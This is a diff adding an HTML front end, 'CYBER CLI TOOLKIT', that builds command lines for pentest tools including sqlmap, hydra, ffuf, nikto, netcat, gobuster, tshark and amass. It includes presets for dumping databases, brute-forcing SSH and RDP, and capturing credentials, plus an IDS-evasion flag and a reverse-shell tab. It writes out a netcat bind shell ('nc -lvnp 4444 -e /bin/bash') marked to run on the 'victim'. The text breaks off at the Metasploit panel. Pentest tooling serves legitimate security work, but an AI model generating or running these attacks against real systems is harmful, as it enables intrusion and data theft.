@@ -1,0 +1,1112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CYBER CLI TOOLKIT</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<!-- NAVBAR -->
+<nav>
+  <div class="nav-inner">
+    <span class="nav-brand">⚡ CYBERKIT</span>
+    <div class="nav-sep"></div>
+    <button class="nav-btn active" onclick="switchTool('sqlmap')">SQLmap</button>
+    <button class="nav-btn" onclick="switchTool('ffuf')">FFUF</button>
+    <button class="nav-btn" onclick="switchTool('hydra')">Hydra</button>
+    <button class="nav-btn" onclick="switchTool('nikto')">Nikto</button>
+    <button class="nav-btn" onclick="switchTool('netcat')">Netcat</button>
+    <button class="nav-btn" onclick="switchTool('gobuster')">Gobuster</button>
+    <button class="nav-btn" onclick="switchTool('wireshark')">Tshark</button>
+    <button class="nav-btn" onclick="switchTool('amass')">Amass</button>
+    <button class="nav-btn" onclick="switchTool('metasploit')">Metasploit</button>
+    <button class="nav-btn" onclick="switchTool('john')">John</button>
+    <button class="nav-btn" onclick="switchTool('dirsearch')">Dirsearch</button>
+    <button class="nav-btn" onclick="switchTool('aircrack')">Aircrack-ng</button>
+    <button class="nav-btn" onclick="switchTool('payload')">💣 Payload Gen</button>
+  </div>
+</nav>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-eyebrow">// EDUCATIONAL USE ONLY //</div>
+  <h1 class="hero-title">CYBER <span>CLI</span> TOOLKIT</h1>
+  <p class="hero-sub">[ SELECT A TOOL → CONFIGURE → GENERATE COMMAND ]</p>
+</div>
+
+<main>
+  <div class="warning">
+    ⚠️ &nbsp; FOR EDUCATIONAL &amp; LEGAL PENTESTING ONLY. NEVER USE ON SYSTEMS YOU DON'T OWN OR HAVE EXPLICIT PERMISSION TO TEST.
+  </div>
+
+  <!-- ══════════════ SQLMAP ══════════════ -->
+  <div id="panel-sqlmap" class="tool-panel active">
+    <div class="tool-header">
+      <div class="tool-icon">💉</div>
+      <div>
+        <div class="tool-name">SQLMAP</div>
+        <div class="tool-desc">Automatic SQL injection detection and database exploitation tool. One of the most powerful tools for database pentesting.</div>
+        <div class="tool-tag">SQL INJECTION</div>
+      </div>
+    </div>
+
+    <div class="presets">
+      <span style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--muted);align-self:center;">PRESETS:</span>
+      <button class="preset-btn" onclick="loadPreset('sqlmap','basic')">Basic Scan</button>
+      <button class="preset-btn" onclick="loadPreset('sqlmap','aggressive')">Aggressive</button>
+      <button class="preset-btn" onclick="loadPreset('sqlmap','dump-all')">Dump All DBs</button>
+      <button class="preset-btn" onclick="loadPreset('sqlmap','stealth')">Stealth Mode</button>
+    </div>
+
+    <div class="form-grid">
+      <div class="field">
+        <label>Target URL *</label>
+        <input type="text" id="sql-url" placeholder="http://site.com/page?id=1" oninput="buildSqlmap()">
+      </div>
+      <div class="field">
+        <label>Cookie</label>
+        <input type="text" id="sql-cookie" placeholder="PHPSESSID=abc123; admin=1" oninput="buildSqlmap()">
+      </div>
+      <div class="field">
+        <label>Proxy</label>
+        <input type="text" id="sql-proxy" placeholder="http://127.0.0.1:8080" oninput="buildSqlmap()">
+      </div>
+      <div class="field">
+        <label>Threads</label>
+        <input type="number" id="sql-threads" placeholder="1" min="1" max="10" oninput="buildSqlmap()">
+      </div>
+      <div class="field">
+        <label>Risk Level</label>
+        <select id="sql-risk" onchange="buildSqlmap()">
+          <option value="">Default (1)</option>
+          <option value="--risk=2">2 - Medium</option>
+          <option value="--risk=3">3 - High</option>
+        </select>
+      </div>
+      <div class="field">
+        <label>Level</label>
+        <select id="sql-level" onchange="buildSqlmap()">
+          <option value="">Default (1)</option>
+          <option value="--level=3">3 - Medium</option>
+          <option value="--level=5">5 - Max</option>
+        </select>
+      </div>
+      <div class="field">
+        <label>DBMS</label>
+        <select id="sql-dbms" onchange="buildSqlmap()">
+          <option value="">Auto-detect</option>
+          <option value="--dbms=mysql">MySQL</option>
+          <option value="--dbms=mssql">MSSQL</option>
+          <option value="--dbms=postgresql">PostgreSQL</option>
+          <option value="--dbms=sqlite">SQLite</option>
+          <option value="--dbms=oracle">Oracle</option>
+        </select>
+      </div>
+      <div class="field">
+        <label>Technique</label>
+        <select id="sql-tech" onchange="buildSqlmap()">
+          <option value="">All techniques</option>
+          <option value="-technique=B">Boolean-based</option>
+          <option value="-technique=T">Time-based</option>
+          <option value="-technique=U">Union-based</option>
+          <option value="-technique=E">Error-based</option>
+        </select>
+      </div>
+    </div>
+
+    <div class="section-label">FLAGS</div>
+    <div class="check-group">
+      <label class="check-item"><input type="checkbox" id="sql-batch" onchange="buildSqlmap()"> --batch (no prompts)</label>
+      <label class="check-item"><input type="checkbox" id="sql-dbs" onchange="buildSqlmap()"> --dbs (list databases)</label>
+      <label class="check-item"><input type="checkbox" id="sql-dump" onchange="buildSqlmap()"> --dump (dump tables)</label>
+      <label class="check-item"><input type="checkbox" id="sql-dump-all" onchange="buildSqlmap()"> --dump-all</label>
+      <label class="check-item"><input type="checkbox" id="sql-random-agent" onchange="buildSqlmap()"> --random-agent</label>
+      <label class="check-item"><input type="checkbox" id="sql-tor" onchange="buildSqlmap()"> --tor (route via Tor)</label>
+      <label class="check-item"><input type="checkbox" id="sql-dork" onchange="buildSqlmap()"> --forms (auto-form scan)</label>
+      <label class="check-item"><input type="checkbox" id="sql-os-shell" onchange="buildSqlmap()"> --os-shell</label>
+      <label class="check-item"><input type="checkbox" id="sql-tamper" onchange="buildSqlmap()"> --tamper=space2comment</label>
+    </div>
+
+    <div class="output-section">
+      <div class="output-label">GENERATED COMMAND</div>
+      <div class="output-box" id="sql-output"><span class="prompt">$</span> sqlmap <span style="color:var(--muted)"># fill fields above</span></div>
+      <div class="btn-row">
+        <button class="btn success" onclick="copyCmd('sql-output')">⎘ COPY</button>
+        <button class="btn danger" onclick="resetPanel('sqlmap')">✕ RESET</button>
+        <span class="copy-feedback" id="sql-copied">COPIED!</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════ FFUF ══════════════ -->
+  <div id="panel-ffuf" class="tool-panel">
+    <div class="tool-header">
+      <div class="tool-icon">🔁</div>
+      <div>
+        <div class="tool-name">FFUF</div>
+        <div class="tool-desc">Fast web fuzzer. Used for directory brute-forcing, parameter fuzzing, subdomain discovery, and API endpoint testing.</div>
+        <div class="tool-tag">WEB FUZZER</div>
+      </div>
+    </div>
+
+    <div class="presets">
+      <span style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--muted);align-self:center;">PRESETS:</span>
+      <button class="preset-btn" onclick="loadPreset('ffuf','dirs')">Directory Hunt</button>
+      <button class="preset-btn" onclick="loadPreset('ffuf','subdomains')">Subdomain Enum</button>
+      <button class="preset-btn" onclick="loadPreset('ffuf','params')">Param Fuzz</button>
+      <button class="preset-btn" onclick="loadPreset('ffuf','api')">API Endpoints</button>
+    </div>
+
+    <div class="form-grid">
+      <div class="field">
+        <label>Target URL (with FUZZ) *</label>
+        <input type="text" id="ffuf-url" placeholder="http://target.com/FUZZ" oninput="buildFfuf()">
+      </div>
+      <div class="field">
+        <label>Wordlist Path</label>
+        <input type="text" id="ffuf-wordlist" placeholder="/usr/share/wordlists/dirb/common.txt" oninput="buildFfuf()">
+      </div>
+      <div class="field">
+        <label>Extensions</label>
+        <input type="text" id="ffuf-ext" placeholder="php,html,js,txt" oninput="buildFfuf()">
+      </div>
+      <div class="field">
+        <label>Threads</label>
+        <input type="number" id="ffuf-threads" placeholder="40" min="1" max="200" oninput="buildFfuf()">
+      </div>
+      <div class="field">
+        <label>Match HTTP Codes</label>
+        <input type="text" id="ffuf-mc" placeholder="200,301,302,403" oninput="buildFfuf()">
+      </div>
+      <div class="field">
+        <label>Filter Status Codes</label>
+        <input type="text" id="ffuf-fc" placeholder="404,500" oninput="buildFfuf()">
+      </div>
+      <div class="field">
+        <label>Timeout (sec)</label>
+        <input type="number" id="ffuf-timeout" placeholder="10" oninput="buildFfuf()">
+      </div>
+      <div class="field">
+        <label>Delay (ms)</label>
+        <input type="text" id="ffuf-delay" placeholder="0-500 (randomize)" oninput="buildFfuf()">
+      </div>
+      <div class="field">
+        <label>Output File</label>
+        <input type="text" id="ffuf-output" placeholder="results.json" oninput="buildFfuf()">
+      </div>
+      <div class="field">
+        <label>Output Format</label>
+        <select id="ffuf-format" onchange="buildFfuf()">
+          <option value="">None</option>
+          <option value="-of json">JSON</option>
+          <option value="-of csv">CSV</option>
+          <option value="-of html">HTML</option>
+        </select>
+      </div>
+    </div>
+
+    <div class="section-label">FLAGS</div>
+    <div class="check-group">
+      <label class="check-item"><input type="checkbox" id="ffuf-r" onchange="buildFfuf()"> -r (follow redirects)</label>
+      <label class="check-item"><input type="checkbox" id="ffuf-v" onchange="buildFfuf()"> -v (verbose)</label>
+      <label class="check-item"><input type="checkbox" id="ffuf-recursion" onchange="buildFfuf()"> -recursion</label>
+      <label class="check-item"><input type="checkbox" id="ffuf-silent" onchange="buildFfuf()"> -s (silent mode)</label>
+    </div>
+
+    <div class="output-section">
+      <div class="output-label">GENERATED COMMAND</div>
+      <div class="output-box" id="ffuf-output-box"><span class="prompt">$</span> ffuf <span style="color:var(--muted)"># fill fields above</span></div>
+      <div class="btn-row">
+        <button class="btn success" onclick="copyCmd('ffuf-output-box')">⎘ COPY</button>
+        <button class="btn danger" onclick="resetPanel('ffuf')">✕ RESET</button>
+        <span class="copy-feedback" id="ffuf-copied">COPIED!</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════ HYDRA ══════════════ -->
+  <div id="panel-hydra" class="tool-panel">
+    <div class="tool-header">
+      <div class="tool-icon">🔑</div>
+      <div>
+        <div class="tool-name">HYDRA</div>
+        <div class="tool-desc">Fast and flexible online brute-force attack tool. Supports 50+ protocols including SSH, FTP, HTTP, SMB, MySQL and more.</div>
+        <div class="tool-tag">BRUTE FORCE</div>
+      </div>
+    </div>
+
+    <div class="presets">
+      <button class="preset-btn" onclick="loadPreset('hydra','ssh')">SSH Attack</button>
+      <button class="preset-btn" onclick="loadPreset('hydra','ftp')">FTP Attack</button>
+      <button class="preset-btn" onclick="loadPreset('hydra','http')">HTTP POST</button>
+      <button class="preset-btn" onclick="loadPreset('hydra','rdp')">RDP Attack</button>
+    </div>
+
+    <div class="form-grid">
+      <div class="field">
+        <label>Target Host *</label>
+        <input type="text" id="hydra-target" placeholder="192.168.1.1 or target.com" oninput="buildHydra()">
+      </div>
+      <div class="field">
+        <label>Protocol *</label>
+        <select id="hydra-proto" onchange="buildHydra()">
+          <option value="ssh">SSH</option>
+          <option value="ftp">FTP</option>
+          <option value="http-post-form">HTTP POST Form</option>
+          <option value="http-get">HTTP GET</option>
+          <option value="rdp">RDP</option>
+          <option value="smb">SMB</option>
+          <option value="mysql">MySQL</option>
+          <option value="mssql">MSSQL</option>
+          <option value="postgresql">PostgreSQL</option>
+          <option value="telnet">Telnet</option>
+          <option value="vnc">VNC</option>
+          <option value="smtp">SMTP</option>
+          <option value="pop3">POP3</option>
+          <option value="imap">IMAP</option>
+        </select>
+      </div>
+      <div class="field">
+        <label>Username (single)</label>
+        <input type="text" id="hydra-user" placeholder="admin" oninput="buildHydra()">
+      </div>
+      <div class="field">
+        <label>Username List</label>
+        <input type="text" id="hydra-userlist" placeholder="/path/to/users.txt" oninput="buildHydra()">
+      </div>
+      <div class="field">
+        <label>Password (single)</label>
+        <input type="text" id="hydra-pass" placeholder="password123" oninput="buildHydra()">
+      </div>
+      <div class="field">
+        <label>Password List</label>
+        <input type="text" id="hydra-passlist" placeholder="/usr/share/wordlists/rockyou.txt" oninput="buildHydra()">
+      </div>
+      <div class="field">
+        <label>Port (optional)</label>
+        <input type="number" id="hydra-port" placeholder="22" oninput="buildHydra()">
+      </div>
+      <div class="field">
+        <label>Threads</label>
+        <input type="number" id="hydra-threads" placeholder="16" min="1" max="64" oninput="buildHydra()">
+      </div>
+      <div class="field" id="hydra-form-field" style="display:none">
+        <label>HTTP Form String</label>
+        <input type="text" id="hydra-form" placeholder="/login:user=^USER^&pass=^PASS^:Invalid" oninput="buildHydra()">
+      </div>
+    </div>
+
+    <div class="section-label">FLAGS</div>
+    <div class="check-group">
+      <label class="check-item"><input type="checkbox" id="hydra-v" onchange="buildHydra()"> -v (verbose)</label>
+      <label class="check-item"><input type="checkbox" id="hydra-vv" onchange="buildHydra()"> -V (show each attempt)</label>
+      <label class="check-item"><input type="checkbox" id="hydra-f" onchange="buildHydra()"> -f (stop on first found)</label>
+      <label class="check-item"><input type="checkbox" id="hydra-e" onchange="buildHydra()"> -e nsr (null,same,reverse)</label>
+      <label class="check-item"><input type="checkbox" id="hydra-s" onchange="buildHydra()"> -s (SSL)</label>
+      <label class="check-item"><input type="checkbox" id="hydra-o" onchange="buildHydra()"> -o results.txt</label>
+    </div>
+
+    <div class="output-section">
+      <div class="output-label">GENERATED COMMAND</div>
+      <div class="output-box" id="hydra-output"><span class="prompt">$</span> hydra <span style="color:var(--muted)"># fill fields above</span></div>
+      <div class="btn-row">
+        <button class="btn success" onclick="copyCmd('hydra-output')">⎘ COPY</button>
+        <button class="btn danger" onclick="resetPanel('hydra')">✕ RESET</button>
+        <span class="copy-feedback" id="hydra-copied">COPIED!</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════ NIKTO ══════════════ -->
+  <div id="panel-nikto" class="tool-panel">
+    <div class="tool-header">
+      <div class="tool-icon">🌍</div>
+      <div>
+        <div class="tool-name">NIKTO</div>
+        <div class="tool-desc">Web server vulnerability scanner. Detects outdated software, misconfigurations, default files and dangerous CGIs.</div>
+        <div class="tool-tag">WEB SCANNER</div>
+      </div>
+    </div>
+
+    <div class="form-grid">
+      <div class="field">
+        <label>Target Host *</label>
+        <input type="text" id="nikto-host" placeholder="target.com or 192.168.1.1" oninput="buildNikto()">
+      </div>
+      <div class="field">
+        <label>Port</label>
+        <input type="number" id="nikto-port" placeholder="80" oninput="buildNikto()">
+      </div>
+      <div class="field">
+        <label>Proxy</label>
+        <input type="text" id="nikto-proxy" placeholder="http://127.0.0.1:8080" oninput="buildNikto()">
+      </div>
+      <div class="field">
+        <label>Output File</label>
+        <input type="text" id="nikto-output" placeholder="report.txt" oninput="buildNikto()">
+      </div>
+      <div class="field">
+        <label>Tuning</label>
+        <select id="nikto-tuning" onchange="buildNikto()">
+          <option value="">All tests</option>
+          <option value="-Tuning 1">1 - Interesting File</option>
+          <option value="-Tuning 2">2 - Misconfiguration</option>
+          <option value="-Tuning 3">3 - Info Disclosure</option>
+          <option value="-Tuning 4">4 - Injection</option>
+          <option value="-Tuning 9">9 - SQL Injection</option>
+          <option value="-Tuning x">x - Reverse Tuning</option>
+        </select>
+      </div>
+    </div>
+
+    <div class="section-label">FLAGS</div>
+    <div class="check-group">
+      <label class="check-item"><input type="checkbox" id="nikto-ssl" onchange="buildNikto()"> -ssl (force HTTPS)</label>
+      <label class="check-item"><input type="checkbox" id="nikto-nossl" onchange="buildNikto()"> -nossl</label>
+      <label class="check-item"><input type="checkbox" id="nikto-evasion" onchange="buildNikto()"> -evasion 1 (IDS bypass)</label>
+      <label class="check-item"><input type="checkbox" id="nikto-ask" onchange="buildNikto()"> -ask no (auto-answer)</label>
+      <label class="check-item"><input type="checkbox" id="nikto-followredirects" onchange="buildNikto()"> -followredirects</label>
+      <label class="check-item"><input type="checkbox" id="nikto-format-html" onchange="buildNikto()"> -Format htm (HTML report)</label>
+    </div>
+
+    <div class="output-section">
+      <div class="output-label">GENERATED COMMAND</div>
+      <div class="output-box" id="nikto-output-box"><span class="prompt">$</span> nikto <span style="color:var(--muted)"># fill fields above</span></div>
+      <div class="btn-row">
+        <button class="btn success" onclick="copyCmd('nikto-output-box')">⎘ COPY</button>
+        <button class="btn danger" onclick="resetPanel('nikto')">✕ RESET</button>
+        <span class="copy-feedback" id="nikto-copied">COPIED!</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════ NETCAT ══════════════ -->
+  <div id="panel-netcat" class="tool-panel">
+    <div class="tool-header">
+      <div class="tool-icon">📡</div>
+      <div>
+        <div class="tool-name">NETCAT</div>
+        <div class="tool-desc">The hacker's Swiss Army knife. Networking utility for reading/writing raw TCP/UDP. Used for reverse shells, port scanning, file transfer and banner grabbing.</div>
+        <div class="tool-tag">NETWORK / SHELLS</div>
+      </div>
+    </div>
+
+    <div class="inner-tabs">
+      <button class="inner-tab active" onclick="switchInnerTab('nc','listener')">LISTENER</button>
+      <button class="inner-tab" onclick="switchInnerTab('nc','connect')">CONNECT</button>
+      <button class="inner-tab" onclick="switchInnerTab('nc','reverse-shells')">REVERSE SHELLS</button>
+      <button class="inner-tab" onclick="switchInnerTab('nc','bind-shells')">BIND SHELLS</button>
+    </div>
+
+    <div id="nc-tab-listener" class="inner-tab-content active">
+      <div class="form-grid">
+        <div class="field">
+          <label>Listen Port *</label>
+          <input type="number" id="nc-listen-port" placeholder="4444" oninput="buildNetcat('listener')">
+        </div>
+        <div class="field">
+          <label>Mode</label>
+          <select id="nc-listen-mode" onchange="buildNetcat('listener')">
+            <option value="">Standard</option>
+            <option value="-k">-k (keep listening)</option>
+            <option value="-u">-u (UDP mode)</option>
+          </select>
+        </div>
+      </div>
+      <div class="check-group" style="margin-bottom:20px">
+        <label class="check-item"><input type="checkbox" id="nc-l-v" onchange="buildNetcat('listener')"> -v (verbose)</label>
+        <label class="check-item"><input type="checkbox" id="nc-l-n" onchange="buildNetcat('listener')"> -n (no DNS)</label>
+      </div>
+      <div class="output-section">
+        <div class="output-label">GENERATED COMMAND</div>
+        <div class="output-box" id="nc-listener-output"><span class="prompt">$</span> nc -lvnp 4444</div>
+        <div class="btn-row">
+          <button class="btn success" onclick="copyCmd('nc-listener-output')">⎘ COPY</button>
+          <span class="copy-feedback" id="nc-listener-copied">COPIED!</span>
+        </div>
+      </div>
+    </div>
+
+    <div id="nc-tab-connect" class="inner-tab-content">
+      <div class="form-grid">
+        <div class="field">
+          <label>Target IP / Host *</label>
+          <input type="text" id="nc-conn-host" placeholder="192.168.1.1" oninput="buildNetcat('connect')">
+        </div>
+        <div class="field">
+          <label>Port *</label>
+          <input type="number" id="nc-conn-port" placeholder="80" oninput="buildNetcat('connect')">
+        </div>
+      </div>
+      <div class="check-group" style="margin-bottom:20px">
+        <label class="check-item"><input type="checkbox" id="nc-c-v" onchange="buildNetcat('connect')"> -v (verbose)</label>
+        <label class="check-item"><input type="checkbox" id="nc-c-n" onchange="buildNetcat('connect')"> -n (no DNS)</label>
+        <label class="check-item"><input type="checkbox" id="nc-c-z" onchange="buildNetcat('connect')"> -z (port scan mode)</label>
+      </div>
+      <div class="output-section">
+        <div class="output-label">GENERATED COMMAND</div>
+        <div class="output-box" id="nc-connect-output"><span class="prompt">$</span> nc target.com 80</div>
+        <div class="btn-row">
+          <button class="btn success" onclick="copyCmd('nc-connect-output')">⎘ COPY</button>
+          <span class="copy-feedback" id="nc-connect-copied">COPIED!</span>
+        </div>
+      </div>
+    </div>
+
+    <div id="nc-tab-reverse-shells" class="inner-tab-content">
+      <div class="form-grid" style="margin-bottom:20px">
+        <div class="field">
+          <label>Attacker IP *</label>
+          <input type="text" id="nc-rs-ip" placeholder="10.0.0.1" oninput="buildReverseShells()">
+        </div>
+        <div class="field">
+          <label>Listener Port *</label>
+          <input type="number" id="nc-rs-port" placeholder="4444" oninput="buildReverseShells()">
+        </div>
+      </div>
+      <div class="section-label">SELECT SHELL TYPE</div>
+      <div class="shell-grid" id="shell-grid">
+        <!-- filled by JS -->
+      </div>
+      <div class="output-section">
+        <div class="output-label">SELECTED SHELL COMMAND</div>
+        <div class="output-box" id="nc-shell-output"><span class="prompt">$</span> <span style="color:var(--muted)"># select a shell type above</span></div>
+        <div class="btn-row">
+          <button class="btn success" onclick="copyCmd('nc-shell-output')">⎘ COPY</button>
+          <span class="copy-feedback" id="nc-shell-copied">COPIED!</span>
+        </div>
+      </div>
+    </div>
+
+    <div id="nc-tab-bind-shells" class="inner-tab-content">
+      <div class="form-grid">
+        <div class="field">
+          <label>Bind Port *</label>
+          <input type="number" id="nc-bind-port" placeholder="4444" oninput="buildBindShell()">
+        </div>
+        <div class="field">
+          <label>OS Target</label>
+          <select id="nc-bind-os" onchange="buildBindShell()">
+            <option value="linux">Linux</option>
+            <option value="windows">Windows</option>
+          </select>
+        </div>
+      </div>
+      <div class="output-section">
+        <div class="output-label">ON TARGET (execute this on victim)</div>
+        <div class="output-box" id="nc-bind-victim"><span class="prompt">$</span> nc -lvnp 4444 -e /bin/bash</div>
+        <div class="output-label" style="margin-top:12px">ON ATTACKER (connect to victim)</div>
+        <div class="output-box" id="nc-bind-attacker"><span class="prompt">$</span> nc [TARGET_IP] 4444</div>
+        <div class="btn-row">
+          <button class="btn success" onclick="copyCmd('nc-bind-victim')">⎘ COPY VICTIM CMD</button>
+          <button class="btn" onclick="copyCmd('nc-bind-attacker')">⎘ COPY ATTACKER CMD</button>
+          <span class="copy-feedback" id="nc-bind-copied">COPIED!</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════ GOBUSTER ══════════════ -->
+  <div id="panel-gobuster" class="tool-panel">
+    <div class="tool-header">
+      <div class="tool-icon">🕵️</div>
+      <div>
+        <div class="tool-name">GOBUSTER</div>
+        <div class="tool-desc">Directory/file bruteforce, DNS subdomain enumeration, virtual host discovery and S3 bucket brute-force tool.</div>
+        <div class="tool-tag">DIR / DNS BRUTEFORCE</div>
+      </div>
+    </div>
+
+    <div class="form-grid">
+      <div class="field">
+        <label>Mode</label>
+        <select id="gob-mode" onchange="buildGobuster()">
+          <option value="dir">dir (Directory/File)</option>
+          <option value="dns">dns (Subdomain)</option>
+          <option value="vhost">vhost (Virtual Hosts)</option>
+          <option value="s3">s3 (S3 Buckets)</option>
+        </select>
+      </div>
+      <div class="field">
+        <label>Target URL / Domain *</label>
+        <input type="text" id="gob-url" placeholder="http://target.com" oninput="buildGobuster()">
+      </div>
+      <div class="field">
+        <label>Wordlist</label>
+        <input type="text" id="gob-wordlist" placeholder="/usr/share/wordlists/dirb/common.txt" oninput="buildGobuster()">
+      </div>
+      <div class="field">
+        <label>Extensions</label>
+        <input type="text" id="gob-ext" placeholder="php,html,js,txt,bak" oninput="buildGobuster()">
+      </div>
+      <div class="field">
+        <label>Threads</label>
+        <input type="number" id="gob-threads" placeholder="50" oninput="buildGobuster()">
+      </div>
+      <div class="field">
+        <label>Status Codes</label>
+        <input type="text" id="gob-status" placeholder="200,301,302,403" oninput="buildGobuster()">
+      </div>
+      <div class="field">
+        <label>User-Agent</label>
+        <input type="text" id="gob-ua" placeholder="Mozilla/5.0" oninput="buildGobuster()">
+      </div>
+      <div class="field">
+        <label>Output File</label>
+        <input type="text" id="gob-out" placeholder="results.txt" oninput="buildGobuster()">
+      </div>
+    </div>
+
+    <div class="section-label">FLAGS</div>
+    <div class="check-group">
+      <label class="check-item"><input type="checkbox" id="gob-r" onchange="buildGobuster()"> -r (follow redirects)</label>
+      <label class="check-item"><input type="checkbox" id="gob-q" onchange="buildGobuster()"> -q (quiet mode)</label>
+      <label class="check-item"><input type="checkbox" id="gob-k" onchange="buildGobuster()"> -k (skip TLS verify)</label>
+      <label class="check-item"><input type="checkbox" id="gob-wildcard" onchange="buildGobuster()"> --wildcard</label>
+      <label class="check-item"><input type="checkbox" id="gob-no-error" onchange="buildGobuster()"> --no-error</label>
+    </div>
+
+    <div class="output-section">
+      <div class="output-label">GENERATED COMMAND</div>
+      <div class="output-box" id="gob-output"><span class="prompt">$</span> gobuster <span style="color:var(--muted)"># fill fields above</span></div>
+      <div class="btn-row">
+        <button class="btn success" onclick="copyCmd('gob-output')">⎘ COPY</button>
+        <button class="btn danger" onclick="resetPanel('gobuster')">✕ RESET</button>
+        <span class="copy-feedback" id="gob-copied">COPIED!</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════ WIRESHARK / TSHARK ══════════════ -->
+  <div id="panel-wireshark" class="tool-panel">
+    <div class="tool-header">
+      <div class="tool-icon">🔬</div>
+      <div>
+        <div class="tool-name">TSHARK</div>
+        <div class="tool-desc">CLI version of Wireshark. Captures and analyzes network packets from the command line. Powerful for traffic analysis and PCAP processing.</div>
+        <div class="tool-tag">PACKET ANALYSIS</div>
+      </div>
+    </div>
+
+    <div class="presets">
+      <button class="preset-btn" onclick="loadPreset('tshark','http')">HTTP Traffic</button>
+      <button class="preset-btn" onclick="loadPreset('tshark','dns')">DNS Queries</button>
+      <button class="preset-btn" onclick="loadPreset('tshark','creds')">Capture Creds</button>
+      <button class="preset-btn" onclick="loadPreset('tshark','pcap')">Read PCAP</button>
+    </div>
+
+    <div class="form-grid">
+      <div class="field">
+        <label>Interface</label>
+        <input type="text" id="ts-iface" placeholder="eth0" oninput="buildTshark()">
+      </div>
+      <div class="field">
+        <label>BPF Capture Filter</label>
+        <input type="text" id="ts-filter" placeholder='port 80 or host 192.168.1.1' oninput="buildTshark()">
+      </div>
+      <div class="field">
+        <label>Display Filter</label>
+        <input type="text" id="ts-dfilter" placeholder="http.request or dns" oninput="buildTshark()">
+      </div>
+      <div class="field">
+        <label>Packet Count</label>
+        <input type="number" id="ts-count" placeholder="1000" oninput="buildTshark()">
+      </div>
+      <div class="field">
+        <label>Read from PCAP</label>
+        <input type="text" id="ts-read" placeholder="capture.pcap" oninput="buildTshark()">
+      </div>
+      <div class="field">
+        <label>Write to File</label>
+        <input type="text" id="ts-write" placeholder="output.pcap" oninput="buildTshark()">
+      </div>
+      <div class="field">
+        <label>Fields to Print</label>
+        <input type="text" id="ts-fields" placeholder="ip.src,http.host,http.request.uri" oninput="buildTshark()">
+      </div>
+    </div>
+
+    <div class="section-label">FLAGS</div>
+    <div class="check-group">
+      <label class="check-item"><input type="checkbox" id="ts-v" onchange="buildTshark()"> -V (verbose packet tree)</label>
+      <label class="check-item"><input type="checkbox" id="ts-q" onchange="buildTshark()"> -q (quiet/stats only)</label>
+      <label class="check-item"><input type="checkbox" id="ts-x" onchange="buildTshark()"> -x (hex+ASCII dump)</label>
+      <label class="check-item"><input type="checkbox" id="ts-n" onchange="buildTshark()"> -n (no name resolution)</label>
+      <label class="check-item"><input type="checkbox" id="ts-p" onchange="buildTshark()"> -p (no promiscuous mode)</label>
+    </div>
+
+    <div class="output-section">
+      <div class="output-label">GENERATED COMMAND</div>
+      <div class="output-box" id="ts-output"><span class="prompt">$</span> tshark <span style="color:var(--muted)"># fill fields above</span></div>
+      <div class="btn-row">
+        <button class="btn success" onclick="copyCmd('ts-output')">⎘ COPY</button>
+        <button class="btn danger" onclick="resetPanel('wireshark')">✕ RESET</button>
+        <span class="copy-feedback" id="ts-copied">COPIED!</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════ AMASS ══════════════ -->
+  <div id="panel-amass" class="tool-panel">
+    <div class="tool-header">
+      <div class="tool-icon">🔍</div>
+      <div>
+        <div class="tool-name">AMASS</div>
+        <div class="tool-desc">In-depth DNS enumeration and OSINT-based subdomain discovery. One of the best recon tools for attack surface mapping.</div>
+        <div class="tool-tag">SUBDOMAIN ENUM / OSINT</div>
+      </div>
+    </div>
+
+    <div class="form-grid">
+      <div class="field">
+        <label>Subcommand</label>
+        <select id="amass-sub" onchange="buildAmass()">
+          <option value="enum">enum (Enumeration)</option>
+          <option value="intel">intel (OSINT)</option>
+          <option value="viz">viz (Visualization)</option>
+          <option value="track">track (Change Tracking)</option>
+          <option value="db">db (Database)</option>
+        </select>
+      </div>
+      <div class="field">
+        <label>Domain *</label>
+        <input type="text" id="amass-domain" placeholder="target.com" oninput="buildAmass()">
+      </div>
+      <div class="field">
+        <label>Output File</label>
+        <input type="text" id="amass-out" placeholder="results.txt" oninput="buildAmass()">
+      </div>
+      <div class="field">
+        <label>Config File</label>
+        <input type="text" id="amass-config" placeholder="~/.config/amass/config.ini" oninput="buildAmass()">
+      </div>
+      <div class="field">
+        <label>Resolvers File</label>
+        <input type="text" id="amass-resolvers" placeholder="resolvers.txt" oninput="buildAmass()">
+      </div>
+      <div class="field">
+        <label>Timeout (min)</label>
+        <input type="number" id="amass-timeout" placeholder="30" oninput="buildAmass()">
+      </div>
+    </div>
+
+    <div class="section-label">FLAGS</div>
+    <div class="check-group">
+      <label class="check-item"><input type="checkbox" id="amass-passive" onchange="buildAmass()"> -passive (no active recon)</label>
+      <label class="check-item"><input type="checkbox" id="amass-brute" onchange="buildAmass()"> -brute (bruteforce subs)</label>
+      <label class="check-item"><input type="checkbox" id="amass-whois" onchange="buildAmass()"> -whois</label>
+      <label class="check-item"><input type="checkbox" id="amass-ip" onchange="buildAmass()"> -ip (show IPs)</label>
+      <label class="check-item"><input type="checkbox" id="amass-v" onchange="buildAmass()"> -v (verbose)</label>
+      <label class="check-item"><input type="checkbox" id="amass-norecursive" onchange="buildAmass()"> -norecursive</label>
+    </div>
+
+    <div class="output-section">
+      <div class="output-label">GENERATED COMMAND</div>
+      <div class="output-box" id="amass-output"><span class="prompt">$</span> amass enum -d target.com</div>
+      <div class="btn-row">
+        <button class="btn success" onclick="copyCmd('amass-output')">⎘ COPY</button>
+        <button class="btn danger" onclick="resetPanel('amass')">✕ RESET</button>
+        <span class="copy-feedback" id="amass-copied">COPIED!</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════ METASPLOIT ══════════════ -->
+  <div id="panel-metasploit" class="tool-panel">
+    <div class="tool-header">
+      <div class="tool-icon">🧨</div>
+      <div>
